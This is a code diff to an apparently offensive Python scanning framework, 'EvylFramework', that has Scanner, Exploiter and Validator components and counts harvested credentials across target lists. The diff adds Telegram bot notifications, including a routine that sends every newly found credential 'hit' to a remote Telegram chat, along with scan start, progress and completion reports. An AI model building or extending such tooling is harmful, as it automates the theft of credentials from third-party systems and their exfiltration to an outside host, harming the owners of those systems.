@@ -37,6 +37,7 @@ from core.reporter import Reporter
 from utils.logger import Logger
 from utils.progress import ProgressDisplay
 from utils.network import NetworkManager
+from utils.telegram import TelegramNotifier, TelegramProgressNotifier
 
 console = Console()
 
@@ -48,6 +49,12 @@ class EvylFramework:
         self.logger = Logger(verbose=getattr(args, 'verbose', False))
         self.network_manager = NetworkManager()
         
+        # Initialize Telegram notifications
+        bot_token = getattr(args, 'bot_token', None)
+        chat_id = getattr(args, 'chat_id', None)
+        self.telegram = TelegramNotifier(bot_token, chat_id)
+        self.telegram_progress = TelegramProgressNotifier(self.telegram)
+        
         # Handle unlimited values
         threads = self._parse_unlimited_value(getattr(args, 'threads', 'unlimited'), default_unlimited=1000)
         timeout = self._parse_unlimited_value(getattr(args, 'timeout', 'unlimited'), default_unlimited=None)
@@ -55,12 +62,14 @@ class EvylFramework:
         self.scanner = Scanner(
             threads=threads,
             timeout=timeout,
-            network_manager=self.network_manager
+            network_manager=self.network_manager,
+            telegram_notifier=self.telegram
         )
         self.exploiter = Exploiter(self.scanner)
         self.validator = Validator() if getattr(args, 'validate', True) else None
         self.reporter = Reporter(getattr(args, 'output_dir', 'results'))
         self.progress = ProgressDisplay()
+        self.scan_start_time = None
         
     def _parse_unlimited_value(self, value, default_unlimited=None):
         """Parse unlimited values from arguments"""
@@ -97,12 +106,20 @@ class EvylFramework:
                 return
             
             self.logger.info(f"Loaded {len(targets)} targets")
+            self.scan_start_time = time.time()
             
-            # Set filename in progress display
+            # Send Telegram notification about scan start
+            target_filename = "N/A"
             if getattr(self.args, 'target_file', None):
                 import os
-                filename = os.path.basename(self.args.target_file)
-                self.progress.update_filename(filename)
+                target_filename = os.path.basename(self.args.target_file)
+                self.progress.update_filename(target_filename)
+            
+            await self.telegram.notify_scan_start(
+                target_filename, 
+                len(targets), 
+                self.scanner.threads
+            )
             
             # Check if progress display should be disabled
             if getattr(self.args, 'no_progress', False):
@@ -134,13 +151,59 @@ class EvylFramework:
                 self.logger.info("Generating reports...")
                 await self.reporter.generate_reports(scan_results)
                 
+                # Send completion notification
+                scan_duration = time.time() - self.scan_start_time if self.scan_start_time else 0
+                completion_stats = {
+                    'total_processed': scan_results.total_processed,
+                    'unique_urls': scan_results.unique_urls,
+                    'credentials_found': len(scan_results.credentials),
+                    'success_rate': scan_results.success_rate,
+                    'duration': scan_duration
+                }
+                await self.telegram.notify_scan_complete(completion_stats)
+                
                 # Final summary
                 self.display_summary(scan_results)
                 
         except KeyboardInterrupt:
             self.logger.warning("Scan interrupted by user")
+            await self.telegram.notify_error("Scan interrupted by user")
         except Exception as e:
             self.logger.error(f"Scan failed: {e}")
+            await self.telegram.notify_error(f"Scan failed: {str(e)}")
+    
+    def create_enhanced_progress_display(self):
+        """Create a progress display that includes Telegram notifications"""
+        class EnhancedProgressDisplay:
+            def __init__(self, base_progress, telegram_progress):
+                self.base_progress = base_progress
+                self.telegram_progress = telegram_progress
+                self.last_hit_count = 0
+            
+            def update_stats(self, stats):
+                # Update base progress
+                self.base_progress.update_stats(stats)
+                
+                # Check for new hits and send notifications
+                current_hits = len(stats.credentials)
+                if current_hits > self.last_hit_count:
+                    # New hits found, send notifications for each new hit
+                    for i in range(self.last_hit_count, current_hits):
+                        if i < len(stats.credentials):
+                            asyncio.create_task(self.telegram_progress.notifier.notify_hit_found(stats.credentials[i]))
+                    self.last_hit_count = current_hits
+                
+                # Send progress update if needed
+                asyncio.create_task(self.telegram_progress.maybe_notify_progress(
+                    stats.total_processed, 
+                    stats.unique_urls, 
+                    current_hits
+                ))
+            
+            def update_filename(self, filename):
+                self.base_progress.update_filename(filename)
+        
+        return EnhancedProgressDisplay(self.progress, self.telegram_progress)
     
     def load_targets(self) -> List[str]:
         """Load targets from file or command line"""
